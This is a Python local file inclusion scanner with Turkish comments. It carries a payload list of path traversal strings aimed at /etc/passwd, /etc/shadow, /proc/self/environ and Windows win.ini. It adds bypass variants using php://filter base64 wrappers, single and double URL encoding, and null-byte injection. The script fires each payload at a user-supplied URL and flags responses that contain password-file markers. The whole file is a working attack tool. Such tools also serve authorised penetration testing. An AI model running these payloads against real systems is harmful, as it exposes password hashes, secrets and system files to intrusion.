import requests
import base64
from urllib.parse import quote
from rich.console import Console
from rich.table import Table

console = Console()

# Payload Listesi (Linux, Windows ve Bypass Teknikleri)
payloads = {
    "Linux": [
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "../../../../../../etc/hosts",
        "../../../../../../proc/self/environ"
    ],
    "Windows": [
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    ],
    "Bypass": [
        # Base64 Encoded
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=C:\\Windows\\win.ini",
        
        # URL Encoding
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252fetc%252fpasswd",
        
        # Double URL Encoding
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        
        # NULL Byte Injection
        "../../../../../../etc/passwd%00",
        "../../../../../../windows/win.ini%00"
    ]
}

def scan_lfi(target_url):
    console.print(f"[cyan][*] Scanning: {target_url}[/cyan]")

    table = Table(title="LFI Scan Results")
    table.add_column("Payload", style="yellow")
    table.add_column("Status", style="green")

    found_vulnerabilities = []

    for category, payload_list in payloads.items():
        console.print(f"[blue]Testing {category} Payloads...[/blue]")
        
        for payload in payload_list:
            test_url = f"{target_url}{payload}"
            try:
                response = requests.get(test_url, timeout=5)
                
                # Base64 Encoded İçeriği Çözme
                if "php://filter" in payload and response.status_code == 200:
                    decoded_content = base64.b64decode(response.text).decode(errors="ignore")
                    if "root:x:" in decoded_content or "Administrator" in decoded_content:
                        table.add_row(payload, f"[bold red]Vulnerable ({category})![/bold red]")
                        found_vulnerabilities.append((payload, category))
                
                # Normal LFI İçerik Kontrolü
                elif "root:x:" in response.text or "Administrator" in response.text:
                    table.add_row(payload, f"[bold red]Vulnerable ({category})![/bold red]")
                    found_vulnerabilities.append((payload, category))
                
                elif response.status_code == 200:
                    table.add_row(payload, f"[green]Possible ({category})[/green]")
                else:
                    table.add_row(payload, "[grey]Not Vulnerable[/grey]")
            
            except requests.exceptions.RequestException:
                table.add_row(payload, "[red]Failed[/red]")

    console.print(table)

    # Eğer açık bulunduysa kaydet
    if found_vulnerabilities:
        with open("lfi_results.txt", "w") as f:
            for payload, category in found_vulnerabilities:
                f.write(f"{payload} - {category}\n")
        console.print("[green][+] Vulnerabilities saved to lfi_results.txt[/green]")
    else:
        console.print("[yellow][-] No vulnerabilities found.[/yellow]")

if __name__ == "__main__":
    target = input("Enter Target URL (e.g., http://example.com/page.php?file=): ")
    scan_lfi(target)
